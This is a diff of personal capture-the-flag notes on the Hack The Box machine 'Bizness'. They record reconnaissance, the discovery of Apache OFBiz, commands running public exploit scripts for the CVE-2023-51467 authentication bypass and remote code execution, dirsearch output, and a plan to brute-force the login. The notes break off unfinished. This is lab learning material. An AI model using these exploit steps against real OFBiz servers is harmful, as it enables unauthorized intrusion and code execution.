@@ -125,7 +125,7 @@ Task Completed
 
 ```
 
-Nginx in nmap but noticed Apahce OFBiz Powers the website at the footer
+
 
 Nikto
 
@@ -219,3 +219,109 @@ END_TIME: Tue Feb 27 15:06:26 2024
 DOWNLOADED: 4612 - FOUND: 0
 
 ```
+
+No luck
+
+Nginx in nmap but noticed Apahce OFBiz Powers the website at the footer
+
+* what is Apache OFBiz?
+  * CVE-2023-51467
+  * The vulnerability permits attackers to circumvent authentication processes, enabling them to remotely execute arbitrary code
+
+{% embed url="https://github.com/Chocapikk/CVE-2023-51467" %}
+
+```
+-[~/.venv/CVE-2023-51467]$ python exploit.py -u http://bizness.htb
+[18:58:49] Vulnerable URL found: http://bizness.htb, Response: PONG                                              exploit.py:53
+|████████████████████████████████████████| 1/1 [100%] in 1.1s (0.90/s) 
+
+```
+
+It is vulnerable bc PONG
+
+now to exploit
+
+Found another github with scanner and exploit python script
+
+{% embed url="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass" %}
+
+```
+[Tue Feb 27-19:08:01]-[table@parrot]-
+-[~/Apache-OFBiz-Authentication-Bypass]$ python3 exploit.py --url https://bizness.htb:443 --cmd 'CMD'
+[+] Generating payload...
+[+] Payload generated successfully.
+[+] Sending malicious serialized payload...
+[+] The request has been successfully sent. Check the result of the command.
+
+```
+
+in exploit i noticed the script was running to the /webtools/control/main in Apache OFBiz
+
+I see this on https://bizness.htb/webtools/control/main
+
+
+
+```
+    Web Tools Main Page
+    default
+
+
+For something interesting make sure you are logged in, try username: admin, password: ofbiz.
+
+NOTE: If you have not already run the installation data loading script, from the ofbiz home directory run "gradlew loadAll" or "java -jar build/libs/ofbiz.jar -l"
+
+Login
+
+```
+
+admin:ofbiz does not work
+
+&#x20;in BurpSuite maybe I can see something in Repeater or do something to login
+
+may need the user access first...
+
+Dirbuster, dirsearch, nikto, fuff, wfuzz again with ../webstools/control/ and nothing
+
+Finally had to get a big hint on why my directory enumeration was not working. Here is the TRUE way to use dirsearch
+
+```
+-[~]$ dirsearch -u https://bizness.htb/ --exclude-status 403,404,500,502,400,401
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
+
+Output File: /home/table/.dirsearch/reports/bizness.htb/-_24-02-27_19-31-40.txt
+
+Error Log: /home/table/.dirsearch/logs/errors-24-02-27_19-31-40.log
+
+Target: https://bizness.htb/
+
+[19:31:40] Starting: 
+[19:31:50] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
+[19:31:57] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/
+[19:31:58] 302 -    0B  - /common  ->  https://bizness.htb/common/
+[19:31:58] 302 -    0B  - /content  ->  https://bizness.htb/content/
+[19:31:58] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
+[19:31:58] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
+[19:31:59] 200 -   34KB - /control
+[19:31:59] 200 -   34KB - /control/
+[19:32:01] 302 -    0B  - /error  ->  https://bizness.htb/error/;jsessionid=C12B0E82503A29488FA406B5A2B35958.jvm1
+[19:32:01] 302 -    0B  - /example  ->  https://bizness.htb/example/
+[19:32:03] 302 -    0B  - /images  ->  https://bizness.htb/images/
+[19:32:04] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main
+[19:32:04] 200 -   27KB - /index.html
+[19:32:13] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml
+[19:32:14] 200 -   21B  - /solr/admin/
+
+Task Completed
+
+```
+
+Now back to figuring out how to login
+
+can use burpsuite intruder tab to brute force the login
+
+{% embed url="https://bizness.htb/accounting/control/login" %}
+
